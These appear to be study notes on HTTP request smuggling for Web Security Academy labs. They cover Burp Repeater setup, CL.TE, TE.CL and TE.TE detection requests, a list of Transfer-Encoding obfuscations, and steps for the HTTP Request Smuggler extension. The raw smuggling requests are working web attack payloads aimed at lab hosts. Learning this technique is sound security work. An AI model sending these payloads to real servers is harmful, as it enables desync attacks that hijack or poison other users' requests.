# Switch Burp Repeater to HTTP/1
Manually switch protocols in **Burp Repeater -> Inspector Panel -> Request attributes section**
# Performing the Attack
## Preparing Burp for Request Smuggling
1. Find request for root page and send to Repeater
2. Downgrade HTTP protocol to HTTP/1.1 (Inspector tab on right)
3. Change Request Method to POST by right-clicking
4. Disable automatic update of Content-Length (settings icon next to 'Send')
5. Show non-printable characters (option at top-right of Request section)
6. Send the request normally to ensure it is properly working

## Detecting the Vulnerability
![Pasted image 20250501090652.png](Pasted image 20250501090652.png)
## Confirming the Vulnerability
![Pasted image 20250501090918.png](Pasted image 20250501090918.png)
- Send the request twice, and the first should be status 200, and second status 403 forbidden
- Ensure there are two `\r\n` after the end of the second request
### CL.TE Example
```
POST / HTTP/1.1 
Host: host.website.here.com
Connection: keep-alive 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 6 
Transfer-Encoding: chunked 

0 

G
```
- Send it twice
- The second response should say: `Unrecognized method GPOST`.
### TE.CL Example
```
POST / HTTP/1.1

Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5c

GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1

0


```
- Ensure `\r\n\` is showing twice after the final `0`
- Send it twice and the second response should say: `Unrecognized method GPOST`.
## TE.TE
There are potentially endless ways to obfuscate the `Transfer-Encoding` header. For example:
```
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space] Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked

Transfer-Encoding: chunked
Transfer-Encoding: cow
```
- Necessary to find some variation of the `Transfer-Encoding` header such that only one of the front-end or back-end servers processes it, while the other server ignores it.
- Depending on whether it is the front-end or the back-end server that can be induced not to process the obfuscated `Transfer-Encoding` header, the remainder of the attack will take the same form as for the CL.TE or TE.CL
- Ensure there are two `\r\n` after the `0` of the second request

Example Request to send a `GPOST` request:
```
POST / HTTP/1.1
Host: 0a9900a6047482318574918700b40052.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```
# Burp Smuggling Extension
For more advanced use watch the [video](https://portswigger.net/research/http-desync-attacks), and check out the [documentation](https://github.com/PortSwigger/http-request-smuggler).
1. Right click on a request and click 'Launch Smuggle probe'
2. Ensure 'permute: badsetupLF' is checked
3. Go to 'Target' tab of Burp (at the top)
4. Select the site you are querying
5. Go to the 'Contents' section of this site to see all requests
6. Go to the 'Issues' section to view any issues
7. Select 'Request 1' to see the issue with the first request
8. Right-click the request and select 'Smuggle attack'
9. A new window will pop up. If you scroll down, you'll see the `GET /hopefull404 HTTP/1.1` request
10. Select 'Attack' button at the bottom
11. Observe the 404 error, and a 200 status request previously with the payload in the data, click 'Halt' at the bottom to pause, then 'Configure' to exit
12. We can go back to the window where we saw the `GET` request section, and we can replace that with any other request we want
	- We can intercept other `GET` requests from other pages, go back to our smuggle request, and paste other `GET` requests into this section (only paste the `GET` and `HOST` section, and keep the `X-ignore` header when pasting)
13. We click 'Attack' again, and we can observe the request was successful